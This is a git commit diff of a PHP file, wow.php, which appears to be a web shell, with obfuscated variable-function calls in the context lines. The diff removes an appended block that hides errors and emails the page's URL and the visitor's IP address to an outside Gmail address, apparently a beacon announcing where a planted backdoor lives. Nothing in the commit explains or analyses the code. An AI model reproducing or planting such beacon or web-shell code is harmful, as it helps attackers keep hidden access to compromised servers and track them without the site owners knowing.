06ffdb9d38dd5890758cb289f59143d38b8a0ab3
lanthau <figththelast@gmail.com>
2024-11-13 11:13:12 +0700

    wow.php

--- wow.php
+++ wow.php
@@ -872,14 +872,3 @@ $izin = $a($b('%o', $c($fl)), -4);
 return $izin;
 }
 ?>
-<?php
-@ini_set('output_buffering', 0);
-@ini_set('display_errors', 0);
-set_time_limit(0);
-ini_set('memory_limit', '64M');
-header('Content-Type: text/html; charset=UTF-8');
-$tujuanmail = '321a3sd2a1d@gmail.com, 321a3sd2a1d@gmail.com';
-$x_path = "http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
-$pesan_alert = "fix $x_path :p *IP Address : [ " . $_SERVER['REMOTE_ADDR'] . " ]";
-mail($tujuanmail, "LOGGER ANJG", $pesan_alert, "[ " . $_SERVER['REMOTE_ADDR'] . " ]");
-?>
